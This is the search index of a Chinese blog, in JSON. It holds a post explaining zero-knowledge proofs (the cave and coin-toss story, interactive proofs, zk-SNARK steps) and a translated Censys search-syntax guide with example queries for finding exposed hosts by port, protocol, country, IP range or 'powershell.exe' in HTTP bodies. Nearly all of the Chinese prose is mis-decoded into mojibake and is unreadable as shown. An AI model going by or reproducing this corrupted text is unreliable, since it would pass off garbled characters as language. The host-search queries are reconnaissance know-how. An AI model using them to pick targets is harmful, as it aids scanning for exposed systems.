é¦–å…ˆï¼Œä¸€ä¸ªç”µè§†æ‘„åˆ¶ç»„æ‹æ‘„äº†æ´å†…ä¸¤ä¸ªæ­»èƒ¡åŒçš„è¯¦ç»†å‚è§‚ã€‚ç„¶åæ‰€æœ‰äººéƒ½èµ°å‡ºäº†å±±æ´ã€‚ç±³å…‹-é˜¿é‡Œåˆç‹¬è‡ªè¿›å»ï¼Œèµ°äº†å…¶ä¸­ä¸€æ¡é€šé“ã€‚ç„¶åï¼Œè®°è€…åœ¨æ‘„åƒæœºçš„é™ªåŒä¸‹ï¼Œåªèµ°åˆ°äº†å²”è·¯å£ã€‚åœ¨é‚£é‡Œï¼Œä»–æŠ›å‡ºä¸€æšç¡¬å¸ï¼Œåœ¨å·¦å³ä¸¤è¾¹åšå‡ºé€‰æ‹©ã€‚å¦‚æœç¡¬å¸æ˜¯æ­£é¢ï¼Œä»–å°±å‘Šè¯‰ç±³å…‹ä»å³è¾¹å‡ºæ¥ã€‚å¦‚æœç¡¬å¸æ˜¯åé¢ï¼Œä»–å°±ä¼šå‘Šè¯‰ç±³å…‹ä»å·¦è¾¹å‡ºæ¥ã€‚ç»“æœæ˜¯æ­£é¢ï¼Œæ‰€ä»¥è®°è€…å¤§å£°å«é“ï¼šâ€œç±³å…‹ï¼Œä»å³è¾¹å‡ºæ¥ã€‚â€ ç±³å…‹å°±è¿™æ ·åšäº†ã€‚ ä¸ºäº†çºªå¿µé‚£å››åä¸ªå°å·ï¼Œè¿™ä¸ªæ¼”ç¤ºåœºæ™¯è¢«æ’­æ”¾äº†å››åæ¬¡ã€‚æ¯ä¸€æ¬¡å¤§å®¶éƒ½å›åˆ°æ´å¤–ï¼Œç±³å…‹ç‹¬è‡ªè¿›å…¥å…¶ä¸­ä¸€ä¸ªé€šé“ï¼Œä¸€è·¯èµ°æ¥ã€‚ç„¶åè®°è€…å’Œæ‘„åƒæœºä¸€ç›´èµ°åˆ°å²”è·¯å£ï¼Œåœ¨é‚£é‡Œä»–é€šè¿‡æŠ›ç¡¬å¸é€‰æ‹©ç»™ç±³å…‹çš„å‘½ä»¤ã€‚ç±³å…‹åœ¨æ‰€æœ‰40ä¸ªåœºæ™¯ä¸­éƒ½æˆåŠŸäº†ã€‚ ä»»ä½•ä¸çŸ¥é“å±±æ´ç§˜å¯†çš„äººéƒ½ä¼šåœ¨ç¬¬ä¸€æ¬¡å¤±è´¥æ—¶è¢«æš´éœ²ã€‚æ¯ä¸€æ¬¡æ–°çš„æµ‹è¯•éƒ½ä¼šä½¿ä¸çŸ¥é“ç§˜å¯†çš„äººçš„æˆåŠŸæœºä¼šå‡å°‘ä¸¤å€ã€‚å¦ä¸€æ–¹é¢ï¼Œè¿™ä¸ªç§˜å¯†è®©ç±³å…‹æ¯æ¬¡éƒ½èƒ½ä»è§„å®šçš„å‡ºå£å‡ºæ¥ã€‚ â€¦â€¦. ","date":"2022-08-22","objectID":"/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/:3:0","tags":["ZKPs","L0","Web3.0"],"title":"é›¶çŸ¥è¯†è¯æ˜","uri":"/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/"},{"categories":["Blockchain"],"content":"é›¶çŸ¥è¯†è¯æ˜ä»‹ç» ä»ä¸Šé¢çš„æ•…äº‹ä¸­, å¯ä»¥çœ‹å‡º é›¶çŸ¥è¯†è¯æ˜ (Zero Knowledge Proofs, ZKPs) æ˜¯åŸºäºæ¦‚ç‡æ€§çš„, è€Œä¸æ˜¯ç¡®å®šæ€§çš„, éšç€æµ‹è¯•çš„ä¸æ–­è¿›è¡Œ, é è¿æ°”çŒœä¸­çš„å‡ ç‡è¶Šæ¥è¶Šä½: 0.5 ^ n é›¶çŸ¥è¯†è¯æ˜ä¸€èˆ¬åŒ…æ‹¬3ä¸ªé˜¶æ®µ: è¯æ˜è€…å‘é€å£°æ˜, å¹¶å°†å…¶å‘é€ç»™éªŒè¯è€… éªŒè¯è€…é€‰æ‹©ä¸€ä¸ªé—®é¢˜, å‘é€ç»™è¯æ˜è€… è¯æ˜è€…ç”Ÿæˆç­”æ¡ˆ, å‘é€ç»™éªŒè¯è€…, éªŒè¯è€…éªŒè¯ç­”æ¡ˆæ˜¯å¦æ­£ç¡® ä½†è¿™é‡Œ, æ˜æ˜¾å¼Šç«¯å°±å‡ºæ¥äº†: å®ƒéœ€è¦éªŒè¯è€…å’Œè¯æ˜è€…ä¸åœçš„è¿›è¡Œå¤šæ¬¡äº¤äº’, ä»¥é™ä½è¿æ°”æ¦‚ç‡, æé«˜å¯ä¿¡åº¦. è¿™æ ·çš„è¯æ˜æ–¹å¼ä¹Ÿç§°ä¸º äº¤äº’å¼é›¶çŸ¥è¯†è¯æ˜ æ¢ä¸€ä¸ªéªŒè¯è€…, è¯æ˜è€…åˆå¾—éœ€è¦é‡å¤ä¸Šè¿°è¿‡ç¨‹ æ‰€ä»¥è¿™åˆå¼•å…¥äº†å¦å¤–ä¸€ä¸ªæ¦‚å¿µç®€æ´çš„éäº¤äº’å¼é›¶çŸ¥è¯†è¯æ˜: â€œZero-Knowledge Succinct Non-Interactive Argument of Knowledgeâ€ï¼Œæˆ– â€œzk-SNARKâ€ï¼Œ ","date":"2022-08-22","objectID":"/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/:4:0","tags":["ZKPs","L0","Web3.0"],"title":"é›¶çŸ¥è¯†è¯æ˜","uri":"/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/"},{"categories":["Blockchain"],"content":"zk-SNARK ç®€æ´çš„éäº¤äº’å¼é›¶çŸ¥è¯†è¯æ˜: â€œZero-Knowledge Succinct Non-Interactive Argument of Knowledgeâ€: Succinct: ç®€æ´, æ„å‘³ç€è¯æ˜å¾ˆçŸ­ï¼ˆä¾‹å¦‚ï¼Œå¯¹äºåŠ å¯†è´§å¸çš„äººæ¥è¯´ï¼Œè®©æˆ‘ä»¬è¯´ï¼Œå®ƒå¯ä»¥å¾ˆå®¹æ˜“åœ°å­˜å‚¨åœ¨ç°æœ‰åŒºå—é“¾çš„äº¤æ˜“ä¸­ï¼‰ï¼Œå¹¶ä¸”å¯ä»¥å¾ˆå®¹æ˜“åœ°è¢«éªŒè¯ï¼ˆä¾‹å¦‚ï¼Œå®ƒå¯ä»¥ç”±åŒºå—é“¾èŠ‚ç‚¹åœ¨éªŒè¯åŒºå—æ—¶å»‰ä»·åœ°æ£€æŸ¥ï¼‰ã€‚ Non-Interactive: éäº¤äº’å¼æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ç¼–å†™å’Œå­˜å‚¨ä¸€ä¸ªè¯æ˜ï¼Œè€Œä¸éœ€è¦åƒä¸»é¡µä¸­çš„ä»‹ç»æ€§ â€œæ–¯è¯ºå…‹çƒ â€œä¾‹å­é‚£æ ·æœ‰é—®é¢˜/ç­”æ¡ˆå¾ªç¯ã€‚å› æ­¤ï¼Œä¸€ä¸ªè¯æ˜å¯ä»¥è¢«è®¡ç®—å‡ºæ¥å¹¶å‘å¸ƒåœ¨åŒºå—é“¾ä¸Šï¼Œæ¯ä¸ªäººéƒ½å¯ä»¥éªŒè¯å®ƒã€‚ zk-Snarké€šå¸¸ä»¥5ä¸ªä¸»è¦æ­¥éª¤çš„åºåˆ—æ¥å®ç°: è¦è¯æ˜çš„è®¡ç®—çš„è¡¨ç¤ºï¼Œä½œä¸ºä¸€ç»„å˜é‡ä¹‹é—´çš„çº¦æŸæ¡ä»¶ å°†ä¸Šè¿°çº¦æŸé›†è¿˜åŸä¸ºå¤šé¡¹å¼æ–¹ç¨‹ é€‰æ‹©ä¸€ä¸ªéšæœºå€¼ï¼Œå¹¶å°†å…¶å’Œæ‰€æœ‰æ–¹ç¨‹å•å‘æ˜ å°„åˆ°ä¸€ä¸ª â€œåŒæ€ â€œç©ºé—´ï¼Œå³ä¸€ä¸ªçº¿æ€§ç»„åˆï¼ˆå¯¹ç³»æ•°çš„æ±‚å’Œå’Œä¹˜æ³•ï¼‰ä»ç„¶æˆç«‹çš„ç©ºé—´ï¼Œå› æ­¤ç¬¬2ç‚¹ä¸­å®šä¹‰çš„æ–¹ç¨‹åœ¨è¿™ä¸ªæ–°ç©ºé—´ä¸­ä»ç„¶æˆç«‹ã€‚è¿™æ˜¯ä¸€ä¸ªå•å‘çš„æ˜ å°„ï¼ŒåŸºäºæ¤­åœ†æ›²çº¿æ•°å­¦ï¼Œæ‰€ä»¥å®ƒæ˜¯ä¸€ç§ â€œåŠ å¯† â€œæŠ€æœ¯ï¼šå¦‚æœä½ åªçŸ¥é“è¢«æ˜ å°„çš„åŠ å¯†ç‚¹ï¼Œé‚£ä¹ˆè®¡ç®—åŸå§‹å€¼åœ¨è®¡ç®—ä¸Šæ˜¯ä¸å¯è¡Œçš„ã€‚ç„¶åï¼ŒåŸå§‹é€‰æ‹©çš„å€¼å°†æ˜¯ä¸€ä¸ªç§˜å¯†ï¼Œæ°¸è¿œä¸ä¼šè¢«ä»»ä½•äººçŸ¥é“ã€‚ è¯æ˜åˆ›å»ºï¼Œé€šè¿‡å°†åœ¨æ‰€é€‰ï¼ˆç§˜å¯†ï¼‰å€¼ä¸­è®¡ç®—çš„æ–¹ç¨‹æ˜ å°„åˆ°åŒæ€ç©ºé—´ã€‚åœ¨è¿™ä¸ªé˜¶æ®µï¼Œéšæœºå€¼è¢«ç”¨æ¥è¿›ä¸€æ­¥éšè—æ–¹ç¨‹ï¼ŒåŒæ—¶ä¿ç•™æ–¹ç¨‹ç»“æ„ã€‚ é€šè¿‡è®¡ç®—æ–¹ç¨‹æ˜¯å¦æˆç«‹æ¥éªŒè¯è¯æ˜ã€‚éªŒè¯ä¸æ˜¯ç›´æ¥åœ¨æ˜ å°„çš„ç©ºé—´ä¸­è¿›è¡Œçš„ï¼Œè€Œæ˜¯é€šè¿‡ä¸€ä¸ª â€œé…å¯¹ â€œå‡½æ•°å°†æ•°å€¼å†æ¬¡æ˜ å°„åˆ°ä¸€ä¸ªæ–°çš„ç©ºé—´ï¼Œè¯¥å‡½æ•°ä¿ç•™å¹¶å…è®¸æ£€æŸ¥åŸå§‹å˜é‡ä¹‹é—´çš„ä¹˜æ³•ã€‚ æ˜¯ä¸æ˜¯ç†è§£èµ·æ¥ç‰¹åˆ«æ‡µé€¼ğŸ˜³ é€šè¿‡ä¸€ä¸ªæ¥è‡ªè¿™é‡Œçš„æ¼«ç”»æ›´å®¹æ˜“ç†è§£ç‚¹ : https://github.com/KevinSmall/zk-SNARKs-Explainer/blob/master/translations/zh-TW/README.md è¿™é‡Œå°±çœ‹åˆ°äº†å‡ ä¸ªå…³é”®å‡½æ•°, è€Œä»–ä»¬å®é™…æ˜¯ç›¸å½“å¤æ‚çš„, æœ‰èƒ½åŠ›çš„çœ‹è¿™é‡Œ https://www.di.ens.fr/~nitulesc/files/Survey-SNARKs.pdf ","date":"2022-08-22","objectID":"/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/:5:0","tags":["ZKPs","L0","Web3.0"],"title":"é›¶çŸ¥è¯†è¯æ˜","uri":"/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/"},{"categories":["Blockchain"],"content":"æ‰©å±•é˜…è¯» Awesome zero knowledge proofs (zkp) https://github.com/matter-labs/awesome-zero-knowledge-proofs zkapps https://docs.minaprotocol.com/en/zkapps ","date":"2022-08-22","objectID":"/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/:6:0","tags":["ZKPs","L0","Web3.0"],"title":"é›¶çŸ¥è¯†è¯æ˜","uri":"/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/"},{"categories":["tools"],"content":"censys https://search.censys.io å ªç§°ç¥å™¨, ç¿»è¯‘äº†ä¸€ä¸‹å¸®åŠ©æ–‡æ¡£ ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:0:0","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"Search Language ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:1:0","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"å…¨æ–‡æœç´¢ å½“æ²¡æœ‰æŒ‡å®šå­—æ®µæ—¶ï¼ŒCensysä¼šå°è¯•å¯¹æ‰€æœ‰å­—æ®µè¿›è¡Œå…¨æ–‡æœç´¢ã€‚ ä¾‹å¦‚ï¼Œæœç´¢Dellå°†è¿”å›location.cityä¸º â€œDell Rapids â€œçš„ä¸»æœºï¼Œä»¥åŠservice.software.vendorä¸º â€œDell â€œçš„ä¸»æœºã€‚å¦‚æœä½ å¯¹æˆ´å°”åˆ¶é€ çš„è®¾å¤‡æ„Ÿå…´è¶£ï¼Œä½ ä¼šå¸Œæœ›æŒ‡å®šå­˜å‚¨è¯¥ä¿¡æ¯çš„å­—æ®µã€‚ ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:1:1","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"æŒ‡å®šå­—æ®µå’Œå€¼ æœ‰æ•ˆçš„æœç´¢å°†æŒ‡å®šä¸€ä¸ªå±æ€§æ‰€å­˜å‚¨çš„å­—æ®µã€‚ä¸ºæ­¤ï¼Œä½ éœ€è¦çŸ¥é“ä½ è¦æœç´¢çš„æ•°æ®é›†ä¸­çš„å­—æ®µã€‚ åœ¨æ•°æ®å®šä¹‰æ ‡ç­¾ä¸‹æŸ¥çœ‹å­—æ®µåŠå…¶ä»·å€¼ç±»å‹çš„å®Œæ•´åˆ—è¡¨ï¼Œæˆ–è€…é€‰æ‹©åœ¨è¯¦æƒ…é¡µä¸ŠæŸ¥çœ‹åŸå§‹æ•°æ®ï¼Œä¾‹å¦‚è°·æ­Œå…¬å…±DNSçš„[ä¸»æœºè¡¨è§†å›¾]ï¼ˆhttps://search.censys.io/hosts/8.8.8.8/data/tableï¼‰ã€‚ ä¸€ä¸ªå…¸å‹çš„æœç´¢è‡³å°‘æä¾›ä¸€ä¸ªå­—æ®µâ€“å®ƒåæ˜ äº†ä½¿ç”¨ç‚¹ç¬¦å·çš„JSONæ¨¡å¼çš„åµŒå¥—ï¼ˆä¾‹å¦‚ï¼Œservices.http.response.headers.server.headersï¼‰ â€” å’Œä¸€ä¸ªå€¼ã€‚å¦‚æœå€¼çš„ç±»å‹æ˜¯æ–‡æœ¬ï¼Œå°†è¿”å›ä¸€ä¸ªæ¨¡ç³ŠåŒ¹é…çš„ç»“æœï¼›å¦‚æœå€¼çš„ç±»å‹æ˜¯å…³é”®è¯ï¼Œåªè¿”å›ä¸€ä¸ªç²¾ç¡®çš„åŒ¹é…ã€‚ ä¾‹å¦‚ï¼Œä½ å¯ä»¥é€šè¿‡æŒ‡å®šå­—æ®µå’Œå€¼æ¥æœç´¢æ‰€æœ‰æœ‰HTTPæœåŠ¡è¿”å›HTTPçŠ¶æ€ç çš„ä¸»æœºã€‚services.http.response.status_code: 500 . ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:1:2","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"Wildcards é€šé…ç¬¦ é»˜è®¤æƒ…å†µä¸‹ï¼ŒCensysæœç´¢çš„æ˜¯å®Œæ•´çš„å€¼ã€‚ä¾‹å¦‚ï¼Œæœç´¢ â€œDel â€œä¸ä¼šè¿”å›åŒ…å« â€œDell â€œçš„è®°å½•ã€‚é€šé…ç¬¦å¯ä»¥ç”¨æ¥æ‰©å¤§æœç´¢èŒƒå›´ï¼Œä»¥ä¾¿åœ¨ç»“æœä¸­åŒ…æ‹¬éƒ¨åˆ†åŒ¹é…ã€‚ æœ‰ä¸¤ä¸ªé€šé…ç¬¦ã€‚ ? - è¿™ä¸ªé€šé…ç¬¦è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ã€‚ * - è¿™ä¸ªé€šé…ç¬¦è¡¨ç¤ºé›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚ ç»„åˆé€šé…ç¬¦ä¹Ÿæ˜¯éå¸¸æœ‰ç”¨çš„ã€‚ ä¸‹é¢çš„æŸ¥è¯¢åˆ©ç”¨CPEè½¯ä»¶æ ¼å¼çš„çŸ¥è¯†ï¼Œæœç´¢è¿è¡Œå¾®è½¯IIS webserversçš„æœåŠ¡ï¼Œå…¶ä¸»è¦ç‰ˆæœ¬\u003c10ï¼ˆå› ä¸º? åªä»£è¡¨ä¸€ä¸ªå­—ç¬¦ï¼‰å’Œç¡®å®šçš„æ¬¡è¦ç‰ˆæœ¬ï¼ˆå› ä¸ºå­˜åœ¨å¥å·ï¼‰ã€‚*é€šé…ç¬¦å CPEæ ¼å¼çš„å…¶ä½™éƒ¨åˆ†ï¼š services.software.uniform_resource_identifier: cpe:2.3:a:microsoft:iis:?.* *é€šé…ç¬¦çš„å¦ä¸€ä¸ªç”¨é€”æ˜¯æ£€æŸ¥ä¸€ä¸ªå­—æ®µæ˜¯å¦å­˜åœ¨ï¼Œè¿™å¯¹æœåŠ¡æœªçŸ¥çš„ä¸»æœºå¾ˆæœ‰å¸®åŠ©ã€‚ä¾‹å¦‚ï¼Œè¿™ä¸ªæŸ¥è¯¢å°†è¿”å›è‡³å°‘æœ‰ä¸€ä¸ªæœåŠ¡å·²ç»ä¸Censyså®ŒæˆTLSæ¡æ‰‹çš„ä¸»æœºï¼šservices.tls: * ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:1:3","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"ç½‘ç»œåè®®å’Œç«¯å£ ä½¿ç”¨CIDRç¬¦å·æœç´¢IPåœ°å€å—ï¼ˆä¾‹å¦‚ï¼Œipï¼š23.20.0.0/14ï¼‰æˆ–é€šè¿‡æä¾›ä¸€ä¸ªèŒƒå›´ï¼šipï¼š[23.20.0.0 to 23.20.5.34/]ã€‚é€šè¿‡æœç´¢æœåŠ¡åç§°å­—æ®µæ¥æœç´¢è¿è¡Œç‰¹å®šåè®®çš„ä¸»æœºï¼š services.service_name: S7 ã€‚é€šè¿‡æœç´¢ç«¯å£å­—æ®µæ¥æœç´¢å…·æœ‰ç‰¹å®šç«¯å£çš„ä¸»æœºï¼šservices.port: 3389 ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:1:4","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"ç”¨å¸ƒå°”é€»è¾‘ç»„åˆæœç´¢æ¡ä»¶ ä½¿ç”¨ â€œANDâ€ã€â€œORâ€ã€â€œNOT â€œå’Œæ‹¬å·æ¥ç»„åˆå¤šä¸ªæœç´¢æ¡ä»¶ã€‚å¸ƒå°”æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œç”±å¸ƒå°”è¡¨è¾¾å¼ç»„åˆçš„æ¡ä»¶æ˜¯é’ˆå¯¹ä¸»æœºæ•´ä½“è¿›è¡Œè¯„ä¼°çš„ã€‚ AND æœç´¢services.port: 8880 and services.service_name: HTTPå°†è¿”å›æ‰“å¼€8880ç«¯å£çš„ä¸»æœºï¼ˆä¸Šé¢è¿è¡Œç€ä»»ä½•æœåŠ¡ï¼‰å’Œè¿è¡Œåœ¨ä»»ä½•ç«¯å£çš„HTTPæœåŠ¡ã€‚ è¦æœç´¢è¿è¡Œåœ¨8880ç«¯å£çš„HTTPæœåŠ¡ï¼Œè¯·ä½¿ç”¨same_service()å‡½æ•°ã€‚same_service(services.port: 8880 and services.service_name: HTTP) . OR æœç´¢services.port: 21 or services.service_name: FTPå°†è¿”å›ä»»ä½•æ‰“å¼€21å·ç«¯å£ï¼ˆåœ¨å…¶ä¸Šè¿è¡Œä»»ä½•æœåŠ¡ï¼‰å’Œåœ¨ä»»ä½•ç«¯å£è¿è¡ŒFTPæœåŠ¡çš„ä¸»æœºã€‚ NOT æœç´¢not same_service(service_name: HTTP and port: 443)å°†è¿”å›é‚£äº›æ²¡æœ‰åœ¨443ä¸Šè¿è¡ŒHTTPçš„ä¸»æœºã€‚ æœç´¢[same_service(service_name: \"HTTP\" and not port:443)](https://search.censys.io/search?q=same_service(service_name%3A+\"HTTP â€œ+and+not+port%3A443)\u0026resource=hosts)å°†è¿”å›ä»»ä½•æœ‰HTTPæœåŠ¡ä½†ä¸åœ¨443ç«¯å£è¿è¡Œçš„ä¸»æœºã€‚è¿™å¯ä»¥åŒ…æ‹¬åœ¨443ä¸Šæœ‰HTTPçš„ä¸»æœºï¼Œåªè¦æœ‰ä¸€ä¸ªä¸åŒç«¯å£å·çš„å…¶ä»–HTTPæœåŠ¡ã€‚ ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:1:5","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"èŒƒå›´ æœç´¢æ•°å­—çš„èŒƒå›´ï¼Œç”¨[ å’Œ ]è¡¨ç¤ºåŒ…å®¹èŒƒå›´ï¼Œç”¨{å’Œ}è¡¨ç¤ºæ’ä»–èŒƒå›´ã€‚ä¾‹å¦‚ï¼Œservices.http.response.status_code:[500 to 503] ã€‚æ—¥æœŸåº”ä½¿ç”¨ä»¥ä¸‹è¯­æ³•è¿›è¡Œæ ¼å¼åŒ–[2012-01-01 to 2012-12-31]ã€‚ä¹Ÿå¯ä»¥æŒ‡å®šå•è¾¹é™åˆ¶[2012-01-01 to *] . toæ“ä½œç¬¦ä¸åŒºåˆ†å¤§å°å†™ã€‚ ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:1:6","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"æ­£åˆ™è¡¨è¾¾å¼ æ­£åˆ™è¡¨è¾¾å¼ä»…é™äºä»˜è´¹å®¢æˆ·ä½¿ç”¨ã€‚å®Œæ•´çš„é‡æ–°ç¼–ç è¯­æ³•æ˜¯å¯åœ¨æ­¤è·å¾—ã€‚ æ³¨æ„ Censysçš„æ­£åˆ™æœç´¢æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œé™¤éä½¿ç”¨ç²¾ç¡®åŒ¹é…æ“ä½œç¬¦=ã€‚ ä¾‹å¦‚ï¼Œservices.software.vendor:/De[l]+/å°†è¿”å›è¯¥è¯å¤§å†™æˆ–å°å†™çš„ç»“æœï¼Œè€Œservices.software.vendor=/De[l]+/å°†åªè¿”å›å¤§å†™è¯çš„ç»“æœã€‚ ###Unicode è½¬ä¹‰åºåˆ— ä»¥ä¸‹åºåˆ—å°†è¢«è§£é‡Šä¸ºunicodeè½¬ä¹‰åºåˆ—ï¼Œä»¥ä½¿ç”¨æˆ·èƒ½å¤Ÿåœ¨å®ƒä»¬ç»å¸¸å‡ºç°çš„åœ°æ–¹æœç´¢è¿™äº›ç‰¹æ®Šå­—ç¬¦ï¼Œå¦‚æœåŠ¡æ ‡è¯­å’ŒHTTPæ­£æ–‡ã€‚ Escape Sequence Character Represented \\a Alert \\b Backspace \\e Escape character \\f Formfeed / Page break \\n Newline \\r Carriage return \\t Horizontal tab \\v Vertical tab ä¾‹å¦‚ï¼Œservices.banner=\"Hello\\nWorld\"å°†æŠŠ\\nè§£é‡Šä¸ºæ¢è¡Œï¼Œè€Œä¸æ˜¯è½¬ä¹‰çš„nã€‚ ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:1:7","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"ä¿ç•™å­—ç¬¦ ä»¥ä¸‹å­—ç¬¦å°†è¢«è§£é‡Šä¸ºæ§åˆ¶å­—ç¬¦ï¼Œé™¤éå®ƒä»¬è¢«åæ–œæ è½¬ä¹‰ï¼ˆå³å‰é¢ï¼‰æˆ–è¢«å°è£…åœ¨ä¸€ä¸ªç”±åæ–œæ åŒ…å›´çš„å­—ç¬¦ä¸²ä¸­ã€‚ = \u003e \u003c ) } ] \" * ? : \\ / ä¾‹å¦‚ï¼Œæ˜Ÿå·åœ¨CPEè½¯ä»¶æ ‡è¯†ç¬¦ä¸­å¾ˆå¸¸è§ï¼Œè€Œè½¬ä¹‰æ¯ä¸ªæ˜Ÿå·æ˜¯å¾ˆç¹ççš„ï¼Œæ‰€ä»¥URIå‘¨å›´çš„åå¼•``å·å°†è½¬ä¹‰å…¶ä¸­æ‰€æœ‰çš„æ˜Ÿå·ã€‚ (services.software.uniform_resource_identifier: `cpe:2.3:a:cloudflare:cloudflare_load_balancer:*:*:*:*:*:*:*:*`) ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:1:8","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"ä¾‹å­ ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:2:0","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"åœ¨è¯¥èŒƒå›´å†…çš„ä¸»æœº 23.0.0.0/8 or 8.8.8.0/24: ip: {\"23.0.0.0/8\", \"8.8.8.0/24\"} ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:2:1","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"åœ¨å¾·å›½è¿è¡Œ FTP æˆ– Telnet çš„ä¸»æœº: location.country_code: DE and services.service_name: {\"FTP\", \"Telnet\"} ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:2:2","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"HTTP æ­£æ–‡ä¸­å¸¦æœ‰ powershell.exe çš„ä¸»æœº: services.http.response.body: powershell.exe ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:2:3","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"â€œSitting on the Dock of the Bayâ€çš„å‡†ç¡® SNMP ä½ç½®å€¼: services.snmp.oid_system.location = \"Sitting on the Dock of the Bay\" ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:2:4","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"å¸¦æœ‰çŸ­è¯­â€œSchneider Electricâ€æˆ– Dell åœ¨ 23.20.0.0/14 èŒƒå›´å†…çš„ä¸»æœºï¼š (\"Schneider Electric\" OR Dell) AND ip:23.20.0.0/14 ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:2:5","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"æ‰“å¼€ä»¥ä¸‹ä»»ä½•ä¸€ä¸ªç«¯å£çš„ä¸»æœºï¼š22ã€23ã€24ã€25: services.port: {22, 23, 24, 25} ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:2:6","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"æ²¡æœ‰è¿è¡Œ HTTP æœåŠ¡çš„ä¸»æœº: NOT services.service_name: HTTP ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:2:7","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"ä¸»æœºå‡ºç¤ºä»»ä½•è¯ä¹¦: services.tls.certificates.leaf_fp_sha_256: * ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:2:8","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"å‘ˆç°å­—ç¬¦ä¸² â€œhello â€œçš„ä¸»æœºç”±ä»»ä½•å€¼ç»§æ‰¿ï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼‰ã€‚ /hello.*/ ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:2:9","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"æå‡ºåç§°ä¸ºfoo1, foo2, foo3â€¦foo100çš„ä¸»æœºï¼Œç”±ä»»ä½•æ•°å€¼ï¼ˆå¸¸è§„è¡¨è¾¾å¼ï¼‰ç»§æ‰¿ã€‚ services.tls.certificates.leaf_data.names=/foo\u003c1-100\u003e.*/ ","date":"2022-08-19","objectID":"/censys%E6%96%87%E6%A1%A3/:2:10","tags":["censys"],"title":"Censysæ–‡æ¡£","uri":"/censys%E6%96%87%E6%A1%A3/"},{"categories":["tools"],"content":"æŒ‡å®šèŒƒå›´å†…çš„ä¸»æœºï¼š ip: [1.12.0.0 TO 1.15.255.255] 